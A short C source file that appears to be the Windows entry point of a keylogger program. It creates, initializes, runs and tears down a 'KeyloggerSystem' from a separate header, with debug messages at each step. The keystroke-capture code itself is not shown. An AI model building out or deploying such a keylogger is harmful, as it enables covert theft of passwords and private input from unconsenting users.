#include <windows.h>
#include <windows.h>
#include "keylogger_system.h"

// DEBUG USAGE

void DebugOutput(const char* format, ...) {
    char buffer[4096];
    va_list args;
    va_start(args, format);
    vsnprintf(buffer, sizeof(buffer), format, args);
    va_end(args);
    OutputDebugStringA(buffer);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    DebugOutput("Keylogger starting...\n");

    KeyloggerSystem* system = keylogger_system_create();
    if (!system) {
        DebugOutput("Failed to create keylogger system\n");
        return 1;
    }

    if (!keylogger_system_initialize(system)) {
        DebugOutput("Failed to initialize keylogger system\n");
        keylogger_system_destroy(system);
        return 1;
    }

    DebugOutput("Keylogger system initialized. Starting main loop...\n");

    if (!keylogger_system_run(system)) {
        DebugOutput("Keylogger system encountered an error while running\n");
        keylogger_system_shutdown(system);
        keylogger_system_destroy(system);
        return 1;
    }

    DebugOutput("Keylogger system shutting down...\n");
    keylogger_system_shutdown(system);
    keylogger_system_destroy(system);

    DebugOutput("Keylogger terminated\n");
    return 0;
}